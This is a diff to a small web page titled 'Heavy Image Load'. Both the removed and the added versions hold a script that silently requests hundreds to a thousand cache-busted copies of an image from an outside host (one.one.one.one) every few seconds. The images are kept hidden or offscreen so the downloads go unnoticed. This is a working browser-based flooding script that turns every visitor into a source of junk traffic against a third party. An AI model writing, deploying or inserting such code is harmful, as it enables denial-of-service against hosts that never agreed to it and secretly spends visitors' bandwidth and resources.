@@ -1,15 +1,47 @@
-<script>
-  const baseUrl = 'https://one.one.one.one/media/card.png';
-  const container = document.createElement('div');
-  container.style.display = 'none'; // keeps it hidden but DOM persists
-  document.body.appendChild(container);
-
-  setInterval(() => {
-    for (let i = 0; i < 100; i++) {
-      const img = new Image();
-      const cacheBuster = `${Date.now()}-${Math.random().toString(36).slice(2)}`;
-      img.src = `${baseUrl}?cb=${cacheBuster}`;
-      container.appendChild(img);
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Heavy Image Load</title>
+  <style>
+    /* Prevent images from being visible, but still force the download */
+    .offscreen {
+      position: absolute;
+      left: -9999px;
+      top: -9999px;
+      width: 1px;
+      height: 1px;
     }
-  }, 2000); // every 2 seconds load 100 more images
-</script>
+  </style>
+</head>
+<body>
+  <h1>Loading 1000 Images...</h1>
+
+  <script>
+    const baseUrl = 'https://one.one.one.one/media/card.png';
+    const totalImages = 1000; // Number of images to load
+    const container = document.createElement('div'); // Container to append images
+    document.body.appendChild(container);
+
+    function loadImages() {
+      for (let i = 0; i < totalImages; i++) {
+        const img = new Image();
+        const cacheBuster = `${Date.now()}-${Math.random().toString(36).substring(2, 6)}`;
+        img.src = `${baseUrl}?cb=${cacheBuster}`; // Unique URL to bypass cache
+        img.className = 'offscreen'; // Off-screen but downloading
+        img.onload = img.onerror = () => {
+          // Optional: Do something when each image loads or fails (like logging)
+          // console.log('Image loaded:', img.src);
+        };
+        container.appendChild(img);
+      }
+    }
+
+    loadImages(); // Start loading images
+
+    // Keep reloading the images every 3 seconds
+    setInterval(loadImages, 3000);
+  </script>
+</body>
+</html>
